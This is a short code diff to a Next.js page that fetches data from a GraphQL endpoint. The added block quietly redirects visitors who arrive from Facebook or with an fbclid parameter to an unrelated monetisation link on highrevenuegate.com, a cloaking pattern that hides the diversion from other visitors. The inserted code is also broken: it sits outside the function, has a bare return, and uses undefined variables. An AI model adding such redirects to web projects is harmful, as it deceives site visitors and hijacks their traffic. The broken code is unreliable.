@@ -3,6 +3,18 @@ import Head from 'next/head';
 import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
+
+	if (referringURL?.includes('facebook.com') || fbclid) {
+
+		return {
+			redirect: {
+				permanent: false,
+				destination: `${
+					`https://www.highrevenuegate.com/z9na8asf0x?key=8621a735656db371065f846f08417f85/`
+				}`,
+			},
+		};
+		}
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	const endpoint = "https://fitomesoo.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
